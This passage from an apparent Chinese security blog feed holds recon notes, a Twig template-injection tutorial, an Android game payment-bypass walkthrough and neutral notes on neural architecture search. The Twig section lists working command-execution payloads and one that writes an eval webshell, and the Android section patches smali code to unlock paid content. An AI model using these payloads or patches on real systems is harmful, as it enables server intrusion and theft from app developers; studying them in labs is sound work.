<h3 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h3><p> <a href="http://phpinfo.me/domain">http://phpinfo.me/domain</a> <a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p>
<h2 id="web站点信息收集"><a href="#web站点信息收集" class="headerlink" title="web站点信息收集"></a><strong>web站点信息收集</strong></h2><blockquote>
<p>  CMS(content managementsystem内容管理系统)，用于网站内容管理内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。</p>
</blockquote>
<h3 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h3><p>常见CMS工具：dedecms(织梦) DIscuz Phpcms等</p>
<h4 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h4><p>  <a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a>  <a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
<p>如识别织梦CMS，该工具将会显示该网站的CMS为dedecms</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/c28013fb2f83a0b6573e55c669b311a8.png" class>

<h4 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h4><p>whatweb  御剑web指纹识别程序  大禹CMS识别程序</p>
<h3 id="CMS漏洞"><a href="#CMS漏洞" class="headerlink" title="CMS漏洞"></a>CMS漏洞</h3><p>(<a href="https://bugs.shuimugan.com/">https://bugs.shuimugan.com</a>)使用一些在线查询漏洞查询Cms漏洞相关厂商的情况</p>
<p>Wordpress（架设自己网站，当作cms来使用）</p>
<p>使用cms查询工具对其进行查询，查询出该cms的域名相关信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/57507dd46949d2cf557018aed1a5ea38.png" class>



<h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a><strong>端口信息收集</strong></h2><blockquote>
<p>  我们在windows命令窗口下输入netstat -anbo显示本机的所有端口情况，如下图</p>
</blockquote>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/6ee2c0f8ec3348578ea7f341c0593268.png" class>



<h3 id="工具探测"><a href="#工具探测" class="headerlink" title="工具探测"></a>工具探测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 输入nmap -A -v -T4探测</span><br><span class="line"></span><br><span class="line">masscan -P端口  网段 –rate=10000</span><br><span class="line"></span><br><span class="line">使用在线工具进行探测目标主机的端口开放</span><br></pre></td></tr></table></figure>



<h3 id="端口攻击"><a href="#端口攻击" class="headerlink" title="端口攻击"></a>端口攻击</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22  SSH远程连接      爆破,SSH隧道及内网代理转发。文件传输</span><br><span class="line"></span><br><span class="line">23  Telnet远程连接     爆破、嗅探、弱口令</span><br><span class="line"></span><br><span class="line">3389 rdp远程桌面      shift后门、爆破</span><br><span class="line"></span><br><span class="line">5900 VNC远程连接     弱口令、RCE</span><br><span class="line"></span><br><span class="line">5632 Pcanywhere远程连接  嗅探、代码执行</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/zhalang8324/article/details/78904692">https://blog.csdn.net/zhalang8324/article/details/78904692</a></p>
<p>防御方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关闭不必要的端口</span><br><span class="line"></span><br><span class="line">对服务端口设置防火墙</span><br><span class="line"></span><br><span class="line">加强员工信息安全意识，经常更换用户密码</span><br><span class="line"></span><br><span class="line">经常更新软件，补丁</span><br></pre></td></tr></table></figure>



<h2 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a><strong>敏感信息收集</strong></h2><p>Google hack语法：对特定网络主机漏洞进行搜索，方便查找</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/3408b3138f5bdfd4d621db6f47b249a3.png" class>

<blockquote>
<p>  通过HTTP或者HTTPS与目标站点进行通信时，响应报文中的seber头和X-powered-by头会暴露目标服务器使用的编程语言，通过这些信息进行漏洞利用</p>
</blockquote>
<p>获取HTTP响应的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.利用工具 如：浏览器审计工具、burpsuite等代理截断工具</span><br><span class="line"></span><br><span class="line">2.编写python脚本  request库</span><br><span class="line">  参考链接：[ttp://www.python-requests.org/en/master](http://www.python-    </span><br><span class="line">  requests.org/en/master)</span><br><span class="line"></span><br><span class="line">    Import requests</span><br><span class="line"></span><br><span class="line">    R=requests.get(‘目标站点’)</span><br><span class="line"></span><br><span class="line">    Print(r.headers)</span><br></pre></td></tr></table></figure>



<h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><p>Gitthub是一个面向<a href="https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669">开源</a>及私有<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053">软件</a>项目的托管平台，因为只支持Git 作为唯一的版本库格式进行托管</p>
<p>存在安全隐患：</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/175f8a115329e108c90d5701136b7733.png" class>



<h2 id="真实IP收集"><a href="#真实IP收集" class="headerlink" title="真实IP收集"></a>真实IP收集</h2><p>CDN的全称是Content Delivery  Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p>
<h3 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h3><h4 id="多地ping"><a href="#多地ping" class="headerlink" title="多地ping"></a>多地ping</h4><p>通过ping来判断是否存在CDN.(ping baidu.com )通过观察发现存在CDN</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/888bf4f927af5fed03536046d2b021e3.png" class>



<p>通过在线ping网站或者代理测试目标</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/0fa40e37784e87b5b384db73c51f1e21.png" class>



<p>探测结果，发现很多DNS，存在大量的边缘服务器</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/8ff8cab6b50bb1848d934678fc66bac6.png" class>



<h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/424d127aeca5709b36b2229dc5bd0ae9.png" class>



<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><p>在shado网站中搜索webcam摄像头信息可以查看摄像头内容</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/dca860ca1d7562cce4c752cf5819a2db.png" class>



<p>使用搜索port:指定端口搜索主机，查看主机开放端口内容以及位置信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/93045e3a2e16fbfec68822145c7ace7e.png" class>

<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/f0930bfece399a4a2d8715912e6e176f.png" class>

<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/d53c5bebed6a08f5c3655e662755206b.png" class>

<p>Shado命令行：</p>
]]></content>
      <categories>
        <category>内功心法</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>-渗透测试 -信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>模板注入之TWIG</title>
    <url>/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/</url>
    <content><![CDATA[<h1 id="模板注入之TWIG"><a href="#模板注入之TWIG" class="headerlink" title="模板注入之TWIG"></a>模板注入之TWIG</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Twig可能是PHP最流行的模板库，它是由Synfony（一个非常流行的PHP框架）的创建者开发的。在我们的练习中，我们还将用到Craft CMS，它是一个内部使用Twig的内容管理系统。</p>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>注:安装环境PHP版本至少7.0</p>
<p>直接使用composer命令安装指定版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer require &quot;twig/twig:^2.0&quot;</span><br></pre></td></tr></table></figure>



<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul>
<li><strong></strong>:说些什么.值的是输出一个变量值或者一个表达式的结果到模板。如：。</li>
</ul>
<p>变量绑定:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello  &#123;&#123; var &#125;&#125;</span><br><span class="line"></span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">twig也包含filters，它可以在模板渲染之前改变输出内容。如:&#123;&#123;表达式 | filters&#125;&#125;。</span><br><span class="line">注:这里还需要注意的是，当表达式中传值的时候，使用『:』,例如：&#123;&#123; path(‘board_reply’,&#123;id:item.id&#125;) &#125;&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p><strong><a href title target></a></strong>:做些什么.控制模板逻辑的tag(标签),用于执行声明，如if、for循环语句等。</p>
</li>
<li><p><strong></strong>:进行注释.它相当于php的语法。它用于注释单行和多行。注释的内容不作为页面输出。</p>
</li>
</ul>
<h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>相当于占位符，当被另一个模板继承时，可以调用这个模块。定义时的内容在继承的模板中默认是不会出现的，可以使用 {undefined{ parent() }} 来显示。块名称可以使用字母数字字符和下划线，不允许使用破折号(-)</p>
<h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p>不支持多重继承，只支持一个扩展模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html.twig&#x27; %&#125;</span><br><span class="line">&#123;% include %&#125;：包含模板</span><br><span class="line">&#123;% extends %&#125;：扩展模板</span><br><span class="line">&#123;% embed %&#125; xxx &#123;% endembed %&#125;：包含模板并扩展该模板的内容，相当于 include 和 extends 的结合体</span><br><span class="line">&#123;% macro %&#125; xxx &#123;% endmacro %&#125;：定义宏以便多次调用，与定义 PHP 函数无异</span><br><span class="line">&#123;% from aaa import bbb as ccc %&#125;：从指定模板导入宏并设置别名</span><br></pre></td></tr></table></figure>



<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>如果在模板中使用extends,它必须是模板中的第一个标签</li>
<li>如果在多个模板中有重复的内容,这可能意味着你需要为该内容在父模板中定义一个block</li>
<li>某些情况下，更好的解决方案可能是把这些内容放到一个新模板中，然后在该模板中include它。</li>
<li>如果你需要从父模板中获取一个block的内容，可以使用函数。如果你只是想在父级块上添加新内容，而不是完全覆盖它</li>
<li>记住添加end符号</li>
</ul>
<h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p><strong>判断变量是否定义(存在)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is defined %&#125;</span><br><span class="line">&#123;%  a.name  %&#125;</span><br><span class="line">&#123;%  endif %&#125;</span><br></pre></td></tr></table></figure>



<p><strong>判断变量是否为空</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a is null %&#125;</span><br><span class="line">&#123;# do something #&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>



<p><strong>多条件判断语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if a %&#125;</span><br><span class="line">    &#123;&#123; a.name &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">        &lt;h1&gt;xxxxxxx&lt;/h1&gt;</span><br><span class="line">   &#123;% endid %&#125;</span><br></pre></td></tr></table></figure>



<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for a in list %&#125;</span><br><span class="line">           &lt;li&gt;&#123;&#123;a.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<p>按数组的key，value遍历，key&#x3D;index，value&#x3D;item</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for index, item in list %&#125;</span><br><span class="line">    &#123;&#123; index &#125;&#125;:&#123;&#123; item.id &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<p>按数组的key值遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for key in list|keys %&#125;</span><br><span class="line">&#123;&#123; key &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><p>twig存在1.x，2.x，3.x的多个版本，不同版本的payload也有所不同。对于Twig来说，其变量_self暴露了Twig内部的许多API。</p>
<h3 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h3><p><strong>getFilter函数中存在危险函数call_user_func</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getFilter(name)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    foreach (this-&gt;filterCallbacks as callback) &#123;</span><br><span class="line">    if (false !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">      return filter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback(callable)</span><br><span class="line">&#123;</span><br><span class="line">  this-&gt;filterCallbacks[] =callable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Twig-2-x-amp-amp-3-x"><a href="#Twig-2-x-amp-amp-3-x" class="headerlink" title="Twig 2.x&amp;&amp;3.x"></a>Twig 2.x&amp;&amp;3.x</h3><p>测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__.&#x27;/vendor/autoload.php&#x27;;</span><br><span class="line"></span><br><span class="line">loader = new \Twig\Loader\ArrayLoader();twig = new \Twig\Environment(loader);template = twig-&gt;createTemplate(&quot;Hello &#123;_GET[&#x27;name&#x27;]&#125;!&quot;);</span><br><span class="line"></span><br><span class="line">echo $template-&gt;render();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>命令执行成功，计算器打开</p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217143043214.png" class title="image-20220217143043214">



<p><strong>使用map过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用sort过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用filter过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用reduce过滤器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;calc&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;calc&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://gosecure.github.io/template-injection-workshop/#0">http://template-injection.gosec.co:8012/.</a></p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145127665.png" class title="image-20220217145127665">



<p>在这个表单中，您可以提交一个简单的表达式来确认模板是否用于显示值。下面的表达式将进行减法运算。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1338-1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>上面减法运算的结果，应该显示为1337</p>
<p>下面输入payload执行id命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>执行结果应该是:</p>
<img src="/2022/05/15/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BTWIG/image-20220217145353259.png" class title="image-20220217145353259">























<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/">twig模板注入payload ~ M1saka’s blog</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>模板注入</category>
        <category>注入漏洞</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -模板注入 -TWIG</tag>
      </tags>
  </entry>
  <entry>
    <title>破解Android游戏(一)</title>
    <url>/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="破解Android游戏-一"><a href="#破解Android游戏-一" class="headerlink" title="破解Android游戏(一)"></a>破解Android游戏(一)</h1><p>原版游戏后续两个场景都被锁住的，点击购买后弹窗显示“支付失败，请稍后重试”购买失败。</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711182933114.png" class title="image-20230711182933114">

<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711182912890.png" class title="image-20230711182912890">



<p>使用Androidkiller打开该apk，搜索关键字符串，如”支付”、“失败”等，这里对”失败”字符串进行unicode编码后进行查找。</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711175927130.png" class title="image-20230711175927130">



<p>通过分析该MymmPay.smali文件，其中涉及到支付购买功能的方法有payResultCansel()、payResultFalse()、payResultSuccess()这三个，我们需要对购买取消以及购买失败这两个方法进行构造来完成未支付即可成功的效果。</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711180107154.png" class title="image-20230711180107154">



<p>修改程序逻辑可以分为替代法和从Switch分支来修改调用方法</p>
<h2 id="替换法"><a href="#替换法" class="headerlink" title="替换法"></a>替换法</h2><p>这里替换的是将支付失败和支付取消这两个方法中的逻辑修改为支付成功的逻辑以此来实现。</p>
<p>payResultCancel()方法中可以看到”购买取消”的字符串</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711180734587.png" class title="image-20230711180734587">

<p>然后将payResultSuccess()方法中的代码替换到该方法中</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711182236251.png" class title="image-20230711182236251">

<p>将其反编译签名后运行查看游戏状态</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711182831706.png" class title="image-20230711182831706">

<p>点击购买后等待一时间即可解锁所有场景</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711182550343.png" class title="image-20230711182550343">

<h2 id="修改Switch分支"><a href="#修改Switch分支" class="headerlink" title="修改Switch分支"></a>修改Switch分支</h2><p>可以看到上面三个方法是对购买商品后不同结果的描述，那么程序是如何来判断调用这三个不同方法呢？</p>
<p>我们先来寻找何处调用payResultFalse()方法，对其进行搜索</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711190825267.png" class title="image-20230711190825267">

<p>可以看到这里使用了Switch分支判断调用哪个方法，当case为0时调用payResultSuccess()方法，否则调用payResultFalse()方法</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711191142568.png" class title="image-20230711191142568">



<p>要使得白嫖，一种是case语句中都为switch_0，使得跳转到支付成功方法，另一种就是将switch_1中的语句中的payResultFalse()修改为payResultSuccess()方法。</p>
<img src="/2023/03/12/%E7%A0%B4%E8%A7%A3Android%E6%B8%B8%E6%88%8F(%E4%B8%80)/image-20230711191608134.png" class title="image-20230711191608134">]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
        <category>案例分析</category>
      </categories>
      <tags>
        <tag>-逆向 -android</tag>
      </tags>
  </entry>
  <entry>
    <title>神经网络架构搜索</title>
    <url>/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="神经网络架构搜索"><a href="#神经网络架构搜索" class="headerlink" title="神经网络架构搜索"></a>神经网络架构搜索</h1><p>神经架构搜索（NAS），它就是一门专门研究如何可以不借助于人工的人工调试的方式就可以达到自动化设计高性能深度神经网络架构的技术。NAS本质上是一个优化问题，通过合适的优化算法对NAS进行求解，最终自动化得到一个神经网络的结构。</p>
<img src="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/image-20231127170632039.png" class title="image-20231127170632039">

<p>在文献当中，通常将NAS表示为右下角的优化问题，* $D_{train}$和$D_{valid}$分别代表训练集和验证集， $A$代表网路架构的搜索空间，$_A$代表其中的一个解。搜索过程就是从$A$中搜索出$_A$，在训练集上训练之后再在验证集上测试使误差最小，其中误差用$L$表示。**展开来说就是设计搜索空间$A$来找到解$_A$**。</p>
<p>通常我们找不到精确搜寻的算法，所以我们必须要考虑一些复杂的优化方法通过迭代的方式搜索获得（NAS搜索策略），在搜索过程中，需要将搜索的结果通过性能评估。总的来说，一个NAS算法由三个部分组成：<strong>搜索空间、搜索策略和性能评估。</strong></p>
<img src="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/image-20231127171749669.png" class title="image-20231127171749669">

<h2 id="搜索空间"><a href="#搜索空间" class="headerlink" title="搜索空间"></a>搜索空间</h2><p>根据搜索空间的颗粒度设计不同，目前搜索空间可以大概分成以下四类：</p>
<ul>
<li>Layer-based: 默认是层与层之间顺序连接</li>
<li>Block-based: 每个块包含多个层，每个块里面每个层的设计是不一样的</li>
<li>Cell-based: 每个cell中包含多个块</li>
<li>Topology-based: 关注的是基本单元如何连接</li>
</ul>
<img src="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/image-20231127172123375.png" class title="image-20231127172123375">

<h2 id="搜索策略"><a href="#搜索策略" class="headerlink" title="搜索策略"></a>搜索策略</h2><p>包括强化学习(R-L)方法、梯度下降方法和EC方法等</p>
<img src="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/image-20231127172228545.png" class title="image-20231127172228545">

<p>强化学习基于固有的强化学习框架，通过控制器在搜索空间中采样出来几个单元组成网络，并对性能进行评估。将评估的结果根据强化学习的策略设计搜索更好的解。这类工作是NAS比较早期的工作。缺点是比较耗时，并且无法做到自动化。</p>
<img src="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/image-20231127172326489.png" class title="image-20231127172326489">

<p>基于梯度下降的方法主要关注基本单元是如何连接的。这种方法将NAS搜索问题建模为分类问题，再用梯度方法求解。缺点是没有数学保证，另外该方法需要构建一个大网络（supernet）。该方法效率高主要是因为加入先验，或者说是利用了weight-sharing的机制，并不是梯度下降带来的效率高的问题。</p>
<img src="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/image-20231127172406213.png" class title="image-20231127172406213">

<p>基于EC的方法基于EC的基本框架。相较于其他两种方法，EC方法的优势是可以实现完全的自动化。</p>
<img src="/2024/01/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E6%90%9C%E7%B4%A2/image-20231127172453813.png" class title="image-20231127172453813">

<h2 id="性能评估"><a href="#性能评估" class="headerlink" title="性能评估"></a>性能评估</h2><p>为了指导搜索策略高效的运行，搜索一次之后到底往哪个方向搜索，需要知道当前的搜索情况，这也是EC里面经常提到的fitness evaluation。这是任何迭代搜索算法都需要的。在NAS里面性能评估主要是对深度神经网络在训练集上进行训练，但随着网络规模或者数据量的扩大，训练时非常耗时的。大量的NAS搜索都面临时间代价的问题。</p>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-架构搜索 -神经网络 -机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场</title>
    <url>/2021/10/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
